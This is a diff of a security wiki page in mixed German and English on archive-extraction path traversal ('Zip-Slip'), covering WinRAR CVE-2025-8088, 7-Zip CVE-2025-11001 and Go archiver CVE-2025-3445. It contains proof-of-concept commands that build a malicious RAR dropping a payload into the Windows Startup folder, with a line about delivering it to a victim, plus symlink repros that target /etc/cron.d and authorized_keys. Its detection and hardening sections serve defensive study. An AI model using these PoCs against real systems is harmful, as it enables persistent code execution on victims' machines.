@@ -1,28 +1,31 @@
-# Archivextraktions-Pfadüberquerung ("Zip-Slip" / WinRAR CVE-2025-8088)
+# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Übersicht
+## Überblick
 
-Viele Archivformate (ZIP, RAR, TAR, 7-ZIP usw.) erlauben es jedem Eintrag, seinen eigenen **internen Pfad** zu tragen. Wenn ein Extraktionswerkzeug diesen Pfad blind akzeptiert, wird ein gestalteter Dateiname, der `..` oder einen **absoluten Pfad** (z. B. `C:\Windows\System32\`) enthält, außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben. Diese Art von Schwachstelle ist weithin bekannt als *Zip-Slip* oder **Archivextraktions-Pfadüberquerung**.
+Viele Archivformate (ZIP, RAR, TAR, 7-ZIP, etc.) erlauben jedem Eintrag, einen eigenen **internen Pfad** mitzuführen. Wenn ein Extraktionsprogramm diesen Pfad blind übernimmt, wird ein manipulierte Dateiname mit `..` oder einem **absoluten Pfad** (z. B. `C:\Windows\System32\`) außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben.
+Diese Art von Schwachstelle ist weithin bekannt als *Zip-Slip* oder **archive extraction path traversal**.
 
-Die Folgen reichen von der Überschreibung beliebiger Dateien bis hin zur direkten Erreichung von **Remote Code Execution (RCE)**, indem ein Payload an einem **Auto-Run**-Standort wie dem Windows *Startup*-Ordner abgelegt wird.
+Die Auswirkungen reichen vom Überschreiben beliebiger Dateien bis hin zum direkten Erreichen von **remote code execution (RCE)** durch Ablegen einer Nutzlast in einem **auto-run**-Ort wie dem Windows *Startup*-Ordner.
 
-## Grundursache
+## Ursache
 
-1. Angreifer erstellt ein Archiv, in dem einer oder mehrere Dateiköpfe enthalten sind:
-* Relative Traversalsequenzen (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
-* Absolute Pfade (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-2. Opfer extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut, anstatt ihn zu bereinigen oder die Extraktion unter dem gewählten Verzeichnis zu erzwingen.
-3. Die Datei wird im vom Angreifer kontrollierten Standort geschrieben und beim nächsten Triggern dieses Pfades durch das System oder den Benutzer ausgeführt/geladen.
+1. Attacker erstellt ein Archiv, in dem ein oder mehrere File-Header Folgendes enthalten:
+* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
+* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
+2. Victim extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut (oder symlinks folgt) statt ihn zu bereinigen oder die Extraktion unterhalb des gewählten Verzeichnisses zu erzwingen.
+3. Die Datei wird an einem von Attacker kontrollierten Ort geschrieben und beim nächsten Auslösen dieses Pfads vom System oder Nutzer ausgeführt/geladen.
 
-## Beispiel aus der Praxis – WinRAR ≤ 7.12 (CVE-2025-8088)
+## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR für Windows (einschließlich der `rar` / `unrar` CLI, der DLL und des tragbaren Quellcodes) konnte Dateinamen während der Extraktion nicht validieren. Ein bösartiges RAR-Archiv, das einen Eintrag wie enthält:
+WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) failed to validate filenames during extraction.
+A malicious RAR archive containing an entry such as:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-würde **außerhalb** des ausgewählten Ausgabeverzeichnisses und im *Startup*-Ordner des Benutzers landen. Nach dem Anmelden führt Windows automatisch alles aus, was dort vorhanden ist, was *persistente* RCE ermöglicht.
+würden **außerhalb** des ausgewählten Ausgabeordners und im *Startup*-Ordner des Benutzers landen. Nach der Anmeldung führt Windows dort automatisch alles aus, was sich dort befindet, und ermöglicht so *persistente* RCE.
 
 ### Erstellen eines PoC-Archivs (Linux/Mac)
 ```bash
@@ -31,38 +34,65 @@ mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Men
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-Options verwendet:
-* `-ep`  – Dateipfade genau so speichern, wie sie angegeben sind (nicht führendes `./` entfernen).
+Verwendete Optionen:
+* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).
 
-Liefern Sie `evil.rar` an das Opfer und weisen Sie es an, es mit einer verwundbaren WinRAR-Version zu extrahieren.
+Liefern Sie `evil.rar` an das Opfer und weisen Sie es an, die Datei mit einem verwundbaren WinRAR-Build zu entpacken.
 
-### Beobachtete Ausnutzung in der Wildnis
+### Observed Exploitation in the Wild
 
-ESET berichtete über RomCom (Storm-0978/UNC2596) Spear-Phishing-Kampagnen, die RAR-Archive anfügten, die CVE-2025-8088 ausnutzten, um angepasste Hintertüren zu installieren und Ransomware-Operationen zu erleichtern.
+ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.
+
+## Neuere Fälle (2024–2025)
+
+### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
+* **Fehler**: ZIP-Einträge, die **symbolische Links** sind, wurden beim Extrahieren dereferenziert, wodurch Angreifer das Zielverzeichnis verlassen und beliebige Pfade überschreiben konnten. Benutzerinteraktion ist nur das *Öffnen/Extrahieren* des Archives.
+* **Betroffen**: 7-Zip 21.02–24.09 (Windows & Linux builds). Behoben in **25.00** (Juli 2025) und später.
+* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
+* **Schnelles PoC (Linux)**:
+```bash
+mkdir -p out
+ln -s /etc/cron.d evil
+zip -y exploit.zip evil   # -y preserves symlinks
+7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
+```
+On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.
+
+### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
+* **Fehler**: `archiver.Unarchive()` folgt `../`-Pfaden und symlinked ZIP-Einträgen und schreibt außerhalb von `outputDir`.
+* **Betroffen**: `github.com/mholt/archiver` ≤ 3.5.1 (Projekt inzwischen veraltet).
+* **Behebung**: Wechsel zu `mholt/archives` ≥ 0.1.0 oder Implementierung von Canonical-Path-Checks vor dem Schreiben.
+* **Minimale Reproduktion**:
+```go
+// go test . with archiver<=3.5.1
+archiver.Unarchive("exploit.zip", "/tmp/safe")
+// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
+```
 
 ## Erkennungstipps
 
-* **Statische Inspektion** – Listen Sie Archiv-Einträge auf und kennzeichnen Sie jeden Namen, der `../`, `..\\`, *absolute Pfade* (`C:`) oder nicht-kanonische UTF-8/UTF-16-Codierungen enthält.
-* **Sandbox-Extraktion** – Dekomprimieren Sie in ein temporäres Verzeichnis mit einem *sicheren* Extraktor (z. B. Pythons `patool`, 7-Zip ≥ neueste Version, `bsdtar`) und überprüfen Sie, ob die resultierenden Pfade im Verzeichnis bleiben.
-* **Endpoint-Überwachung** – Alarmieren Sie bei neuen ausführbaren Dateien, die kurz nach dem Öffnen eines Archivs durch WinRAR/7-Zip/etc. in `Startup`/`Run`-Verzeichnisse geschrieben werden.
+* **Statische Inspektion** – Archiv-Einträge auflisten und jeden Namen markieren, der `../`, `..\\`, *absolute Pfade* (`/`, `C:`) enthält oder Einträge vom Typ *symlink*, deren Ziel außerhalb des Extraktionsverzeichnisses liegt.
+* **Kanonisierung** – Sicherstellen, dass `realpath(join(dest, name))` weiterhin mit `dest` beginnt. Andernfalls ablehnen.
+* **Sandbox-Extraktion** – In ein temporäres Verzeichnis mit einem *sicheren* Extractor dekomprimieren (z. B. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) und verifizieren, dass die resultierenden Pfade im Verzeichnis bleiben.
+* **Endpoint-Überwachung** – Alarmieren bei neuen ausführbaren Dateien, die kurz nach dem Öffnen eines Archives durch WinRAR/7-Zip/etc. in `Startup`/`Run`/`cron` geschrieben werden.
 
 ## Minderung & Härtung
 
-1. **Aktualisieren Sie den Extraktor** – WinRAR 7.13 implementiert eine ordnungsgemäße Pfadsanierung. Benutzer müssen es manuell herunterladen, da WinRAR über keinen Auto-Update-Mechanismus verfügt.
-2. Extrahieren Sie Archive mit der **„Pfad ignorieren“**-Option (WinRAR: *Extrahieren → "Keine Pfade extrahieren"*) wann immer möglich.
-3. Öffnen Sie nicht vertrauenswürdige Archive **in einer Sandbox** oder VM.
-4. Implementieren Sie Anwendungs-Whitelisting und beschränken Sie den Schreibzugriff der Benutzer auf Auto-Run-Verzeichnisse.
+1. **Extractor aktualisieren** – WinRAR 7.13+ und 7-Zip 25.00+ implementieren Pfad-/Symlink-Sanitierung. Beide Tools haben weiterhin kein Auto-Update.
+2. Archive mit “**Do not extract paths**” / “**Ignore paths**” extrahieren, wenn möglich.
+3. Unter Unix Privilegien reduzieren & ein **chroot/namespace** mounten, bevor extrahiert wird; unter Windows **AppContainer** oder eine Sandbox verwenden.
+4. Wenn Sie eigenen Code schreiben: vor dem Erstellen/Schreiben mit `realpath()`/`PathCanonicalize()` normalisieren und jeden Eintrag ablehnen, der das Zielverzeichnis verlässt.
 
-## Zusätzliche betroffene / historische Fälle
+## Weitere betroffene / historische Fälle
 
-* 2018 – Massive *Zip-Slip*-Warnung von Snyk, die viele Java/Go/JS-Bibliotheken betrifft.
-* 2023 – 7-Zip CVE-2023-4011 ähnliche Traversierung während des `-ao`-Mergers.
-* Jede benutzerdefinierte Extraktionslogik, die es versäumt, `PathCanonicalize` / `realpath` vor dem Schreiben aufzurufen.
+* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
+* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
+* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.
 
 ## Referenzen
 
-- [BleepingComputer – WinRAR Zero-Day ausgenutzt, um Malware bei der Archivextraktion zu platzieren](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
-- [WinRAR 7.13 Änderungsprotokoll](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
-- [Snyk – Zip Slip-Sicherheitsanfälligkeit](https://snyk.io/research/zip-slip-vulnerability)
+- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
+- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
 
 {{#include ../banners/hacktricks-training.md}}
